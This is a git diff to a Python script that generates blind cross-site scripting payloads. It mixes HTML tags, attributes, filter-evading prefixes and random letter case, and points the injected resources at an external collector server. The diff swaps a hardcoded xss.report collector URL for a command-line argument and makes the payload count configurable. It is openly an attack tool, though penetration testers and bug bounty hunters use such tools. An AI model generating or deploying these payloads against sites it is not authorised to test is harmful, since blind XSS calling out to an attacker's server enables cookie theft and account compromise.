@@ -1,10 +1,16 @@
 import random
-
+import argparse
 #HTML Tagname
+parser = argparse.ArgumentParser(description="Generate payload")
+parser.add_argument('-n', '--number', type=str, required=True, help='Number payload')
+parser.add_argument('-s', '--server', type=str, required=True, help='External server interactive')
+args = parser.parse_args()
+number = args.number
+server = args.server
 tags = ['<img', '<iframe', '<script', '<a','<body','<video','<audio','<embed','<source']
 attributes = ['src', 'href']
-prefix = [r'',r'',r'',r'',r'',r'',r'',r'',r"'>\"", r'\">', r'<"', r'><', r'>"<', r'.\>"</.', r'./>%20<./', r'/>%20<', r'%20/%20>', r'%20">%20<', r'%3E%3C', r'Pjw=']
-url = 'https://xss.report/c/aptx4869'
+prefix = [r'',r'',r'',r'',r'',r'',r'',r'\'>',r"'>\"", r'\">', r'<"', r'><', r'>"<', r'.\>"</.', r'./>%20<./', r'/>%20<', r'%20/%20>', r'%20">%20<', r'%3E%3C', r'Pjw=']
+url = server
 
 def randomize_case(text):
     return ''.join(random.choice([char.upper(), char.lower()]) for char in text)
@@ -25,7 +31,7 @@ def generate_blind_xss_payload():
 #Saved payload
 file_path = "blind_payload.txt"
 with open(file_path, "w", encoding="utf-8") as file:
-    for _ in range(100):
+    for _ in range(int(number)):
         file.write(generate_blind_xss_payload() + "\n")
 
 print(f"Payloads đã được lưu vào tệp {file_path}")
